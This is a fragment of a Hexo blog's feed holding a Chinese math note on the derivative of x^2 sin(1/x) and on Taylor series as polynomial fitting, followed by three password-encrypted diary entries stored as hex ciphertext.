        <content type="html"><![CDATA[<h2 id="f-x-x-2sin-frac-1-x"><a href="#f-x-x-2sin-frac-1-x" class="headerlink" title="$f(x)=x^2sin(\frac{1}{x})$"></a>$f(x)=x^2sin(\frac{1}{x})$</h2><p><video style="width:700px" src=https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/video/video/%E7%A5%9E%E5%A5%87%E7%9A%84%E5%87%BD%E6%95%B0%E4%BB%AC1.mp4></video></p><ul><li><p>x=0未定义</p></li><li><p>x趋于0时函数趋于0，极限为0</p></li></ul><p>其导数：</p><p><video style="width:700px" src=https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/video/video/%E7%A5%9E%E5%A5%87%E7%9A%84%E5%87%BD%E6%95%B0%E4%BB%AC1-1.mp4></video></p><p>求该导函数在0处的极限，因为下图：</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210807132111778.png" alt="image-20210807132111778"></p><p>所以即使其导数中 $2xsin(\frac{1}{x})$  在0处的极限为0，但是导函数中的$-cos(\frac{1}{x})$前面没有x与其抵消，所以仍然是振荡间断点。</p><ul><li>极限的本质更像是建立在可去间断点之上的，这点可以通过研究洛必达求极限的本质是两个微分形式的导数之商，以及从泰勒级数展开图的几何意义来得到启发</li></ul><h2 id="Taylor级数——多项式拟合的第一性原理"><a href="#Taylor级数——多项式拟合的第一性原理" class="headerlink" title="Taylor级数——多项式拟合的第一性原理"></a>Taylor级数——多项式拟合的第一性原理</h2><p>看组图就理解了</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/%E5%A4%9A%E9%A1%B9%E5%BC%8F%E6%8B%9F%E5%90%88.png" alt="img"></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/%E5%A4%9A%E9%A1%B9%E5%BC%8F%E6%8B%9F%E5%90%882.png" alt="img"></p><hr><p>上面就是对x=0处的拟合，也可推广在任意一点做多项式拟合，详细参考<a href="https://www.bilibili.com/video/BV1Gx411Y7cz">https://www.bilibili.com/video/BV1Gx411Y7cz</a></p><p>计算机中对数值的拟合操作中，以matlab为例，其中就有多项式拟合操作。</p><p>问：多项式拟合是基于Taylor的，那别的拟合方式的原理呢？暂时不深究了</p>]]></content>
      
      
      <categories>
          
          <category> Math Weapon </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>diary-220923</title>
      <link href="2023/03/30/diary/diary-220923/"/>
      <url>2023/03/30/diary/diary-220923/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="d122d6425b6024a5462e7b6c9d4716146e5034093cbc96f7e9c6cbcbf3db59ab">dc61e4bf147279f5afd2886e8806a22ca13619d25362f0800ac132f039b2dbce332bf04b9ed7ea1c041ca98c9e11c35ad7640659a29d507ffabad4e34df6b8f0c1c283c38aa97232cde6806dbf3504023c680c256dfb96f51624bab5e26c57cd6e2408fe78531eea7fc4dacd923a566f18db4fdaeec99d176da2dac6d8c2a0d711e7cf7e934fa40060e0232943a9a0b5b25b11edbc4dbf63af45adabaaf6d372ec3ba899e8d116f7a6ac6e47a2c3bc7f45d20c55702cb1d0e077f7c5f6b2d9d6a0d714287e27701ff710f9c818a2d4105e3428cc364382dc7924e7fea2f4ea78aa2d9969e97fb362f2eb05f49070e73c83edd4c5f17216a9398044476f412709db49087babc90efa8a56d528d6a8316a4c39a5181f1df7135213c3d6e19e5b6c522eb9e9fc110c75c6b177724e042a8beed9bd03ad1b47bfd1e52c8f77a0eec08a9e1a298fb8a1770bc9a04245dbabb4352cbb99dedf310f5385996e377c82993755fcfc8e75d4b3669e5c5dd32e7e0e631fb064b193502141ee182edb7c2aa5c0a8f2c4f3ca5d5e51b927d7cfec7d2d27b7c0bc8523bfcdd82c7b1e262ae9475a43f4fa70b45e05c77145974f4f7895acf5c963151d2f93565c122970db6df41c6bea015cb5004028820b5c0adef01c46d8ce1663baa730441c8b82f1f55305b0f37c0fd857892358ba83111b0da693a6a403c2788d20cdfce191edfb6465cb3e06b27d907d0eb19725556efeee9fb1e7bd2328776c10aaabeae85a780b90ef7464a6868f10d051f41bf588f7f0051810f72a43cf8eb787d1cb2e85a4bb74d3526ec2ce0ad40726318f33ea8bdd1580b01feb4dcffd56fc5a51831b46fd3bf52d47be48de53eb72a5445923994e0b9431c07f30063c24308b6586b506da59e529a45ddf20f7da763820dbf8181e99999c038d096687a217478f7b072f9a25f582350b050cc6009b3a35cbdc382c612a9664ed5f9a51d4be1c0a850acb7f5570ffd4685cc79e340d1140ed148c4e3c2afe9985bbc269d62c3806760571871b8cc8f842bfefe81c336a74365c2000be7fcad099a32e56803e3551ddfcb8d5dd90c887303f7b77fe43c21a9248872c7dbbc2e9da390d82909e98dbfe91e9de555a1226bb6cac43b0e7f70cf57fefa2c824c9e9a83d90378abb8bc12b9f22849e46d2f344401386df2df79b2542ccc0424c46f247f28ed2ad082696eaf5e98b3b3ca2c51fd83de72c297a3bb90fe9de73c41d2eb4b81d85aa2494b8bae1d4f45ceb95c873294421856a7e68ce4c91505bcbce773d1f3f7612ce8ffef25fecf8e83dba5d3773667101cd9bf7bf6b7b5a568cadb860d138378438af15bff309c358e302d5c4c5f859de165b37593972ff04219aa6b42ee7011372412a9e1cac7ae3e723d8663001f9cfc59c552946141c81e7a468ee0d62709c9e947e67362840c425259db5eb01f521eeec3ce059aaa5c5ae4875c806edb93fd38ca64144a0ba551c9c3f8cc3006d468831cf1ae98cbec1b213ff86a96d3c2752b206c84df75f79adf45f90194a4b53b93e82b758dd185b63607f340decff26d1d65991d85b946542e9ac8525dc7fa517bf475fbde1625cb0a0e86a590085bc0db117c3f937d9461ac1fa7a08ba22c4aa97ca1da1a1371c998d90c849a0eda9bce4d9d39b4cc6eb39c6280c19a32a66fc21bbe70c3601d080034092db41e827e97cb6d04579ef7ec5738c5676ec6af3058f2a4c294b860e8796be328b78a5f79faa0c7c597296cecbbbda69c88b7d8c7a279535befc2ec7aaf8b093ae66e2c8e6d6de94532fb004b5e879cb97359c9dfb5d3ed56c7c5fd65f5aa74fa063448173eac5f8903193728203c311093fc3511035bd53e85634cc0b94ed7ce68d81ff01c8721ba1d2b0dcece08086d123cd000f8941f17cef8bcafcf270f0fb258fb09b65a39162731298081fb9dc7bea53d54e6385154081c43a71d2f5f87574f4707e75ca45137937b6742a1541eafa63bfc6600b84e90b6505b08cab965634e4390e97411dccfb1920c2c8811e01062a61d68d0c0d5e115e832549aa09c2c740378b14d323e2b1d675aa5ac06f1e9134de344e080250a835c51a96bb1f70f21bdc64c978edaa3e6b50e73efa061fc3a28a0e6ecc77bc0980c707d0e670836ae32013dc801d5fdacfe32ff6632dd83ccd96428f34250ba3983ccdd4182d595163d8f6b95d38d486e61b5c07e9bf164d042cbf1609ea7b5cea09106861e345c218a91fa12b2abdd03009e4601a1af9badf57ee3d942b48473fe05fe25c244440d64eccb9a7347eff8f63d65d56eccd5a42274ef0118d7e9a6062a675f2c9ef8c645d17d554abe12f000ada02f4814a52f9b7ffec2284f6aa74febb7f5731f9feb92f65cdce1c15fdb959aa242922e683cf792be52d7df40ff2737d73f14b89cea0dd79db5720b17462fbc26db62cf142ef45db09410bb6d2370121ef171e4bbc51414b7847a6d1c6924459e61885099b7db4e7376fc7e450c9fcd582439fa1b5fa6b5998d143eeb4aede7d81c732eb7b6a367267b6fa79e82450b26e1a37a2fbb2dcc68db40f1c0097f3a2cfae692692bb2fc0c99bde61cb7ce706b4471d773901856c9b6802a7c7054d0090c4324f6c644446d9e03fccaf9690ee685de5847806ea80e2c50861b72c1b92652a9a21046716f609e314932a36fe287384171a43cb33a2929dc853acffd73b47bbac89a06a01f1766e50152373990189f69cb13260c218842560889bc954758cb4a457ad1aa2380b0d92314ffe3062c924eb590b49367365cf773dae570af12eac3f16fe8631a97ab0d306e1af51d84944eb1765b74607899ed98020cc22e7c19328632a164226977b902ac15bed4de266408ccc4e2de322b7426df680c9f55ba3ca7462cb7179614e83bcec1ecf7903ec81fdb4bfd39d7bdb1a0e094517f27b67365ffb66a1d8d3cafb524edb10fabd7cce7bbff8335abeb0c6ad78fd586cfeccbf7c8c3a96f8b708210d48a9ebca5e3610e2b1d96767f941943803b165fa7b287de7c47045030ed4be7bf65ef746501bde577859b540a572f04460d93797ad5436c05784d525f011747a5fba97fd6cbea85085ec844e7985dcfb3b1ed3312385304d6908628d07979d87c7819e48ab2f952a65d5553bb26816d4cfc8e0156708a796d6b1fd0877afb0ccd7fc5432724451af1b9472d431f0957602260e2e1f037e6ab349ae8a88072007c7af10fc421d43e48015e6d74b0c05ac93ddc975205dd4cc21691ec19290b2b37f80eff957d4bee1066094c5eb5a7dae714400e8cf75db3e47434304ba9bb71cc89e7aff4db6d128e875e1c2aad6e06672fd5239b75a2028638dbab28e29bf77ffbe41464eb64e2edd00bb504b06aa262e91433dddf0644aec3820b3abf1ca634f8f2a9d0316aeb53763070dc62a4fd0cc92900f3340d6a6b4b4c15da50a2fcda8a70b5b</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 经历 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>diary-230127</title>
      <link href="2023/03/30/diary/diary-230127/"/>
      <url>2023/03/30/diary/diary-230127/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="9c47ff55a7eed668b74a6e857bb18a397aaba1f8d1a932a5bd6caada6423db06">73d126e2d5954e9e41a01f74c3fa6ba121648a48c2382c215eb16cf662ee8832c3008e464974dc813d07e68dc50917043a7ccb0eed856a8b36cfc4b62cdb57b6ac1a60bb1d170aebe2b49178d7a0181f6be13655eb9ce6ad1a9e0357061f6657893c3a0a2885820253ad83c3382505d98371e65b4d9cafc1d35a6832aa5e95729f1ddaea41598b9901f3f41e59baceb5bf27da765d0b2054ad89051705e32aeaa8ee987abafafc07d903b7638bd5a4262f433403f2f38d39fbce7ed5d90973c49562e015a8a2b59bc7265ce7957fd6c2b5288857e6d53eb6b45675fc7bda6140c193b35b486951bdbb4b4238ca8ef4eeae2f1f0d21d373900fab5cd1910289c8c534e03b7ac301a966a99f62cadece5ae8df2b9ae124d53bfb37a626e9708fa89e0bd58b9b9c96f74c9f17cd2b59b30d7fcb9d44e6f0b9123c13ee74668ce15e71a500627d9c920b09e185a6cbffe683357e1b32ac911b0223df081be26cb0111655fd34298371f018b1bde2191aed50a994e5d447a04633fe4d536d45dfbc2f363d2c157aa23a4dcd642bc8edbe066183be2350a8608ed8c64d470c2c2102995103c673368f8161c1b9f73850dab562f2e9bad9ed12bfa997471110e81c81fab989be8d364b9b13215085435a77e1ffdd510e5898e04f3cb37697f32d9bc821b3121f7de15aeecb547fbc0dbf1da13c25e1f0a905a3aba05c43635ba0bbe3fb34dae7811fdb4ade0e7ddf177a0787ebe96a44a0ca1910ae30cc09540aeab90babdeba709c640d4b3e594781f8bc4a9726b13fb714434f2f0ae6408e431bcad45fb0a3d209fefebe9b36cbb76770e046b217ee3c5a5296a07f68da55d4973930e1c4b7a8ea8cac1a1daaca27a4199f472c6e4d9a5e1d6bd53f979a0a14df697c9289f264d12d39da8722953b32fac73fd6e47ca41bcc43d1d3be473ff28d9bb0258af92788c96e406e8a264058e9098917e50dc42690250c0629398cd1edf0539f1d373c47997370379b4546b29080607f9bd2431cfa264361a48d34e56eedb1156e62ea6987abd57ec4b7253349a23516901c58ae446c708fafa143533a57729c7c8c10a3f9d5c8a3dec72d47e5a854920f58407cac0fd2e7ec8bdde3a2d34f0ccae697196f2120251014ed3f1a56344cce2320b64d8882675e5a8d2252a61a18b257f9e40f4de1466e19ddd506a4935f87b611e2851cd0afdc86bd97d672b9d42416b57c58fd1c2948382f74704918d1078ef5a7983fc4637e06859cf33a6006bfc6deadf7f63041b9ed228363a65818dfa0b2bee837dd5c583397ba8c215d849e0d0b06155214f6b97b8c0e41084e729465a3e65103d88405c57ee5a66052203c0ff6ed3cbd66676d48054c5846ddbd8c1bb7d27323e9459b89f49bbaef6a341676c446a1aa4d64b6f677cc63c1a23e6ed7fd925ad311390fdbc386b760be806102309e6f668148750e1bc9c17910d0b4ba1505ec255a588c569d5d9404b194c2fbf59f35deaab7aa0526d94cc478088e297e75467b7131b66fee15ba2eee10169ed6adfe864faa7ceed57c580744fba640b622440034a6a635f31bce6f73f0f3e892e044b1aa3a0f4d2887a8bd60fa81eb0dd2ca8954f0204d11034f6ee5692e2de5720e2c6d25cc83633c9ae000cbf081e479d0f9322c1715fa3296c4f9a637bf6da26c12fa5a9d688577ec5d16e2941306ec4fad4a89b705a36cbc9434e8c5f0021c30ad469fd8be61b3cb4bb6a8f3b4092022ea5a663a17d26831dd6a27196d6089499daa65c8903856e0649840c44fe23e58140c338a66facc49191126cfeb6a85ae943386f95781351ce8cbb0e7b4ecd04603b7902fb3928a7311e937dde41aee16045ab96ce26627423480769ac90a8e8341cbf8d2b9a6d9b58ac70e5452a6eeb41263a42a914b7ad11173d31d20167a6cea0c5df4f0d2ebfd4e9094d18f876a1583cc75234d392cb1fa772b08c2c38b8b89adbfa7fd214d2f386c4293b91f618fe46ed1c276fd05c1e148bf89706e7e96e125e1c36215df6f2b8b21454f3722b9bec1fbba6ebfa8617382f2f0cce83364b7dbba2e93da8b7f4ad36b11730fb4658093b88b074723b1e54c97484ab36cc5759cdc0b60817a2db8d5dea10ccc14bc0875b3fd7f79c0ec2a1ebbd430e4551811f7de3977288ae1be8dcc2ac3800adea8e8b631971c9753db1e31ec96de55dc02171adc23e596b4d6062b38ff1831e940639f208d520dff08ad0aadb433457c725e183d89375b6886b8ca5d776c1ab5ce1243fe88917ba39413ac39710e71e8eb7ecb4ee0d5386ca55ac8a29a817f687d3aa4eb4bef42e2d0958e3b059fe8ba88897675f39b39327cc5d98fa9a7fdcd80397551d34ffb5cc7553d6cc3d6cc458fc67214d4016fafa7ed85d9d50fc393d5b0df8548424f576133a7a4eafafc53258a78df361ced4c4d7bf923c8fcb1c2c036a8daf694a340f560fe4d9ecf224463c58f522bd2178cb198b26dae1797d35acb3425888f44376671a212ae8185470864cd183fafa440c2ac464964d5687a4501c9c6b8a64f0d980bda27f3ceaeaf5a0f93756f6bd935f6e1dd0196014051c980733dc91103114d358dafde5b9b3d2b27fa4035655e17c079a09cf4e37a40110985e3ea74f3e32b43b58326db575ea06aa73d8eb5f863a04db4f0909f060dab9a135852d751bde57061c4febe1c9b99f124db7d72af017ae1d8a61ace6b348431bda8f994a5fc9787379820f6af7d9db79e1492d8b03996c65e9d0ec03884d1f5a3de6bf232161aba602ce0fe85cac58aef59dbcd13d0c07ef6a4defdc9ffe2e2c7ece997163e74e15414d7e6d1dbd3f88028ad50f0e7acfc62e760203319af82784019f722f4ea201fdaeffab8ed3cba0d4ab4a1c7d474eb12d3ed882baaeb70f8922ffb357fd89b253827b64f6b7748c248d0d0ce5d14a7f2206b2f97ebeb55e052189f01584b982625d25ec916b315cd2600dea1c4c98d8753c016ce2ede261e5f662b3b721c85c11e57c95bf4babc1da8a86e738890c621bf2fdeb7ec5e09ba6ff56725c1456a9d9bec560fb9abbd29f6f8884d1896ef01c4dd23494f8f517fd05368ef344d9ef9b07618a5147806e736cba9a1eff8d772d383179ff3a195c78e1149271e6daac65d0e13f90f0dee521348987fbf0d4180a6a7100d38bc64d4b519aaac49a4ace7e80ac42713948df7cd2081c1a9a126efc9bcd6acdefea4072d64acd34557920c9eb8666f08a402e0be539990a7ce11bee4169b5eba48cc37d27cd05537f25bc4a05472fe79b198819c67f3365daa3fcefccde23ce1b8f7056598799bb154b66793e752e6ce363698def60c50e46cdeb5307c1868f4424aba89213b2a98004fabad709e73594d774874de4693c537a6e04d6343aa85dc829064a69511dedfc992f24d67158786d91c6c3ece19b51f810765dde24fd3643c9f0f899b9778d7a2d9a819eea3ae9bbd2cb6491ac8a6d5990cd58571684b6d010094659f8190544d40420a315a8fc7df29f83dac02fbf8d07fcb1e003c2358ab3ce88ad0ee847f5b2983d869b02b6eab1670ecaa35af9a9a76003f8aa06cba7fd59f7b27d6cffef16f8f49ff3de90d0304d09fa1e48ba8efef5a179f8cf5fc1bfeff4f21c33f8e5dacebb8ee14ee718c78e958a945f6e3bb0ba18096aa3aded6c5cb603b8c272df06b5c00236a4af7b6dbfa1aaf47849f58de320b5ec1d5742a12561b6d1845337c1b1b1e50644f45832d785a17a3dadf1a6bd48281eca943f7e3c7741898268b2eec3bee0f2ff8bfbe3c70dcb9e6be7898d890e9810788afcabe3a7443da39ca8d56b1ed97ee6d7f883411d1320d286b19c527ac81c3d6f56d08302f0119be150b19fee86e243a1d0005774d629d24f5f3b4ec0dfd3b3da7e58acdf3e68630f0f642c7807ed0c7b2d9492c4ddd736a1a4d8583e6e4892697328d74dc6f23ecc6d16658a32d67c44a9c9404a0551215b7df442efddf7d8d4b2daf35cfee8f0258dbe17e36a130a9ace3b78b99e34011fde65a1c26ce28376beca4b437c529f8512054944864a8437647b7ad5dbc4f74335eb47cce99d5291a2742521d5804f8e5ca1b5a9ef8ee8963226aa36194ff68f57dfe799919ebedad7d8ad4f3faef24186ada6946ebc8a4af4147aff9372b6a1881249cf95741485338355c932562bfa4fbbd1037a23bcfe5279869e0d1c56450aac06429dd6289c117e200411978af379ac73908502db1080cb59311258ff3577c19d63eacfd9a110438de3a95c898a2557af522e465c6a6083c0414dc50f72bc111851ce7369ed4185459d50f1dfc513b53be43344467dd722890851a0dabc254d2d96b2af5265192c7851e2849f47efaec7c8a499813a1cd64a4882da58491c1f0d8a20547d2285707cff5908e024d2464fa47f86aecf0e4b82b99fdf70dd420c7db91c560c1f0e31ce4a079036e0b2cbf7f114aa89301354d4a67e1d51f98a292505c20e027bca4f680a169c7540df8b5f7ee10c47014c080f047f9c4ee00a3765926d9567c33bc849e65ee16022f54469950243c8c68f1c8c1f8d59f016c0b78d7c6d54dfc907a4caeabc6367bb43de10fc19ad1cdf79cd2ff1343b9733e2dbbf397abf0b715f6cc504fc4a3f64e2745bdd2a6696ace21a93b8f36812a7cd272dbc6803f29c87d902179eaef015cb10a1d65cfb402029c87bccdb9cf38b15110d2a07ca62ff9a4dbda78ada2f210422dc1c0be6d3eeb6357226d76a678775ff5d6337c697fadc4676ba9475b02b6a5307a34ee157581f73503498d389d5d312f803ea6d0b5fb86ca2f45dd28f40a362a1136a214d73a5b5a326c0044af6610b64b7f578d42437fb10ad15d6b40144d03cceec0d9aa592c49f3b66afe6afe44da5e1b8ac260eb0b65ffe13e8764e09a145141365a348299812c8c282d6aa2c20d05ab05045967643efede4825ed507da6cc095b869e5e9223d463c2339ec56da67113f904e5a55ea743b753263cb7d2523b18acbf033387bffe6a440a5c05befea8d1d336dfb74ff3f518dc259c8b5ef644990977c043774e5db7be284040fef49344f87a8e94a359270744e9c48ec089dadaf7686e7051baa3c4aa8cd6812375244c3288e5fe4d5bbdc361f2746420348af2b22880ff8ba5a77f413af2d5ad5512582bc7dd4531825968b5fd8536c3f34d6e5e659aedea5ac5cbfe12c83a653da79ef7bc6b12ea603d713d0fbf5973279705dae2825f9fabe82789572e2af2888b3df9899eb7d002eb94370147f0f38bfd20136af4a19b0c378544f17f1a77053c81993e83a80d85efb0e51f467ac6150c10ca7d40e78911d75217ef5bb6512bb44fdbb4b825a4087eee4a686525d4fa56acee122432950ea156f4eb071ba949b5474cbfa9ddb19c0fdae2a8504a7fea55b20fe34fd6febc6f6d4ca498dc2d399bf24fec34997ff038f7cfd887ebbce2260528024152db890a9ef89832a62862dc38f4699071f97b87fc320cd0da110c8242ccd6d8a8a7860e572bd0a054ec6ad674534d6773351c7ac1fd5cbc3163d295448ea4af8c5b65228d223f3790477df9fb51e7bec671a23b6073a9f22444b4a438ecfed0a7379a39b34adc9629365d83ebd99882a0258dd165f7498142a8aeaa5f52e29ec0f17e0c5e050a0534255673d3406e21762c9ab33c0f1c051c27d46e69e7633aeb480b512177858f0b64a5058785e068d0abf9459f74e4defddb6b5a24309fccffccc1cba406fe247868a9d8c73a90a1d5bd6c5ba4f358e47b1bdbeda2ee4ac08345e3df9dc196a3dbe36af1eec43ebd879719719fe17feb4f828f24277f046a18c518b7fff59681a0837271f4b5be07e24a74f58434a6e8e0d8f4a2f4ccb1391927ca50920c73c876ddc84440662db60d9b72538d44091e45d21434d62d6ccb323f1bf6a49b8d4fe269fb63ac9a3227f021492835ca1ad899b58cb640189f048398a13b7924f8c991a34944a05f796b47ac4f3aeea3652b9a39e6ab01154b490f12d1dade01f8831ccf1458c31c86961c3a806cd7b5e8ee0718a1fd7ec2cb807770449fa0519e4acf09e73980c9f282b66322405a2635974c7a8f8137b021eed92653616f9a0094d4a56d70cce9f5ea6f753f85bc5388562a22376ebf7b79c9f992ecaecb371eec9992e866b4f3f7e7918d572430b1117818de9c6254a0bc2412c5c4e7c96b0fc3e655f0b16ac35ca1e85ea57c074834af9ef8f1c3e998dea093e4f0c8730180458effaa46f288b15be43c26937b08c1505f24948c0311cd37f5ac49708496821a6610538967f4639c6aff0e7ba49c304910afce2f949175038e282ac007bf67d35525d513e38187c537aa1db2ed2335c6f66ff91958dcd60e59e8595396b15f495899defa827f48e324a16f6c46b54cf41b7117bc024c4a6296524e8a1c67d18453439c233bc084c539bcccc772766405ec5114cc3fbadf3e798014df32281442b1f09b8446a5ed75efd0b8f7e0e9c4494ada8f2607519e2e0510fa6ec9177e11db3179349d42b15284517a82f45130fc0fc5e25cd53ea0a0a0c1bd6f2b3d8d56ad4a30ee6596845406e6df70857630947f80e347341375124a4db93b4846c95103f641717380af56a32da6bbfe88d1d9b665311d6180805075fee4f1b3f9838f728420a5a3e7cd71436b34fe382ccb94313add3fd588946136fc678587440e9031b9c28a66a6def798d0397e7699718b37ec29850938e07ed79eec12f445223fbe6695c0f9ea3b53cccd2d0bfe49466f59e8fe99ba776c3ad113ac8351bf7fd2a07225f4f98bb7eded0d4f7223e78c454b869023f088008ebe677a0abf2fdc0b793470ccf3a6ec8fec57694a67130ccea029ec8848e12ad42aaeb268510dc6f678a1a24cb73951daab19b6fc5e0daeea46e36f0197af6d0360c55ec2c38508d743d2695bdbb537a19c8b5d293e61bfe855512dbfa54667b55fc2841e2b142313531cc0e95e2745f9e94aef73de807125bf76e904f26dd12848a3a5e6cdda258af7c65f73080683d49a346e3d18d7f39e55fe2eb59cf912efef281317ba085208c4478f21fce413987716cfa1fab67fad6b64bcab1f28a3e84cd41abc7a4e20696a8d76ab8bed95b9d042ebf2ec06d49f96ae038f171782471151dad97bf1c9d6498aec82efe3ce0de5e03214f45f412be06a24e5fa0743b420ee8be82ecbd869d4d60b633666ad85908e8b36607861158f44c41ab1e139a0dab9e0f79b3f6a30d8996167e61be3057750d53f056e4877398e1fe66a07839ce18ee2401f5a404efb184e49939f292cc6d4699b1270cc08a77035b7834748ae988cff921e84450d671f188e52453e23011b4e2bba57117444b536d2a66ec7a35b293ac5c6fe0355d807b6cfb7709d76e8553b86d03920272d0e273e70ff6ce3932a8035479f646a6d9ea21018cc9494923c36f7b10e14bf92117ee86b12d8475e0ed248294d8c28986b91c1eccf8ed54817455cbfbb257692b45f9b3a0333a0c354ff16c16a03ef9899ae2661719f272971bace68775caae3be1406436cb51f0cfe434cb05524a75be338b5f4610aa37695b21e38195be9ac71edc3ad00afce1cdd0fd536ba6a903962467f56d8fb11a2e5f43c13542de454e87e7cec6edb4638e3c9e2f1e1d8d50e07140d707ed5638e3f28a7a50f34c1fc8f33c90a1058a10367afb6f1e66b10544c4af38ddf2ab45b9a1f8638b834bb43b57b2cbf765a0557469055b38beb51d8bdddef6d68ae68d9c8eff6c4562a9caff6a27fb378e3a3b80bc8adfe2eed5a01b24d6a97b751697b9862e82b51ad73f74503e04b4a9145744e92db1437b52f8db92549fdaddf6562cbc6d6aa4cafc1d8cfd0a2e2438304c5de3d3af2ae4cab67915722ca3a9d33afe32db250844d093f59dec219c92cc68014b1ec8c71ee8fb42ec2885947b8b43f429490adc6c10d2d434f4bd627e40b79aa792cfad26788612997374dfd5491468c401e853ae9c7602006282708cc98170f532f5ba0acff8dec94c83208869a6e2de521a2d740033db8f451db47209f89e2d84cd3137bf440f72ea7dab4ad88378b8024131b0c2e0d6b12e2f7e6f6ac327c547383c82adbbf22b31f713f778ddd889a2c97e50ef86e888044cc3cd86f14c92f34f4b31acc85f1ccb06ecfb29c448a353624e296bd5ba51d26919084c8cb5a909d7a6c0cd8216038d0efcfb7acaed8cf54dc9db2900a63f058aa8a331c52339654917a2a4b71348100f854437e8a32312a54027bbdeddb6c56d9c4911aff5c4224af396725ad3fc27bd749e0367587a4739a507fcac0ca83cbeb00b5785d73983be51d46063d0af77eddf16515e480ee17119a25e3e7be6c53c5c08e55a596bdc8fd15f041723c33ee0fd8c347dfa2197d1bfefd833db20a5d587b0c3f516210be79d72f4dea70cdc84f06cdf7783487c7c1c97d4c3d6735513d63dd619ff5e2f6a64b1efa7e977a29dabe003fa8599caa36b8fee9ab5fc682dc2db2402d902f8f75e7fcc05c3482371e5c5779465e89ec5da37c39e1c408801a9696440cfa49c9fd25560df155ff2866a5a32e40c08ee3ba6cdb1f8062b4143c94aa3138acdfbe64675bcda2c8</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flag </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>exp_master-220508</title>
      <link href="2023/03/30/diary/exp_master-220508/"/>
      <url>2023/03/30/diary/exp_master-220508/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="e42c11553f2e589d3a37cb5fdc804367f3096917426a2b0429e32e96168fcc85">2075815d6d66586da89da1bb8a9f3cfe568b782a60cea797fa19ba46c18defe915af61db16db7956776139fa77b2961127affe9c9fadc9aa128933d01ceace46944ef406d78c3c684265028caf11648ac1eec27909b2c90baa5d14adde77e03aff11b478f4b04621a14b05d3faee3f138593c55ac99110c9749676c6de1249190408217f1ac0faf73fccd266ee2f12d5a936d2fe06a1b56eca5d7e0c37349e4d2707af08d9c68d61af90c0d2090f5056d87fa33c5a90ca5b34c3eef79ef1e88e3885d005829edd628fbf57d735968750a485eb6d264d7503cd0d7e83fe5bbd9ab63c16164a09ed18b794bec8393530b250522e24e902ed32172e85d59342813f9949217e4c66b1c8569eebb4f9881f5220c1e5b6322de0837be515e6502cc9ddcbbc6f49960d69ab44a241a434c58216c11975f87d8d2ff77f33d6404fd6a0c226177a598c2f5b53be24350c099d1649ae1095d1dc209104ce4a1aca41547db770320b1b8f02dff80bdc42d8826714bb3964e7a5c477f2f188428d69f4803015b3439448847858becbf4323ae38202c0f612c7b004e8fb8063fba679ed3e71f0f060df11c1c5a9c5efcf50268e221d9344e978f02f02f3cd37337edba2b832103359658e76a2f960e38a79bb441a11536337a75d2825929429748c49f648fb0cd7b586043b0cd7a445ddd39ef55f523f71a47c88ad9244eacfe612985d8f0aec6acafc9827915180fbd77b81ac56111ec84388ddb1e3a5f264a53a0830bfd62111762f0272f966f0fb0cc21ee054e02f7cf14ce2855fd91f585d3f2d97cd8c1f5633dc0723f2ecd34f0e96803a4420e26e65c9e5fec1a5709a5327e233c36fdcc451c99c290f14552cf3bca0bcfb9acb6e70dc09f6a924b80f5ac396811bccbee8f7f907abdc2d84e93d296c60e38861d11794e6542b8643ee786fcd9b4484f8ba4466a9c380a20d2e8edf509de808464d4135382517d8212779a587f86b361c0d1989e12ab486bc68378700dd4806b173ffec0d79f47141588fa06921a771ce24ae73a67cde4d92f2488342ef683c7c753b5b7710ba185d97aec9f4e1c76066a97f06b45d403ed79d4a31a3b3b52ac0fade977860a3559a59a7bc956823d6cd3f513d7b2c6dd9326a7316688c398ef829294916e8c4ec11a365610440ebbc31e8bb5a78fdf817f7eaa0c2cd211e25b1e2c800f961505d7c0b707fc1b17dd83a86db73e83d5158f3ef2167bcc7c3f67ee37f4c3afec52380e385b6c21a0936c3564b321f4eb0bb12dcf0228a024314bfb08cd1aa3a8e1c1de2566f7ee199f3df235fbe30932da78f0b82076a03c5ad34749e7322d78d15c7b999f630cd6682609a3fdfa087cae34590f3995608a91d69ccad01f83e18a94ca1f0d5927143292dd9d7595004e90959bbadc8fe6d8fd7e01f6a7fc1bb5d746de98a204816675c4f9f874613509a396d25a91668bc469c3b5a6b80bf78b6a776b0a6ea3b6d8a4dd7